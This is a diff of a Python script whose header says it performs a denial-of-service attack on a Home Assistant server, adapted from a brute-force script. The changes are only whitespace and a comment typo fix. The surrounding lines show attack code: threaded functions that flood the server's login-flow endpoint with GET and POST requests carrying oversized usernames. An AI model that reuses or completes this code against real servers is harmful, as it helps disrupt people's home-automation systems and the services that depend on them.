@@ -3,7 +3,6 @@
     Description: This is a modification of ha_bruteforce.py to perform Denial of Service (DOS) attack on HomeAssistant server
 """
 
-
 import subprocess
 import multiprocessing
 import threading
@@ -30,7 +29,6 @@ def get_flow_id(host):
         print("Error: Fail to get flow_id from", host)
     return flow_id
 
-
 # Perform DOS attack with GET requests
 # This function is a modification of get_flow_id()
 def dos_get(host):
@@ -48,10 +46,9 @@ def dos_get(host):
         else:
             print("GET Request sent successfully")
 
-
 # Perform DOS attack with POST requests
 def dos_post(host, flow_id):
-    # Get ready for to send POST requsts
+    # Get ready for to send POST requests
     client_id = host
     host = host + "/auth/login_flow/" + flow_id
     username = "username" * 100
@@ -76,11 +73,8 @@ def dos_attack(host, flow_id):
     threading.Thread(target=dos_get, args=(host,)).start()
     threading.Thread(target=dos_get, args=(host,)).start()
 
-
-
     # Starting DOS attack using POST requests
     threading.Thread(target=dos_post, args=(host, flow_id)).start()
-
 
 def process_arguments():
     host = ""
@@ -102,10 +96,8 @@ def process_arguments():
 
     return host, num_of_dos
 
-
 def main():
     arguments = process_arguments()
-
     if arguments is None:
         exit()
     host = arguments[0]
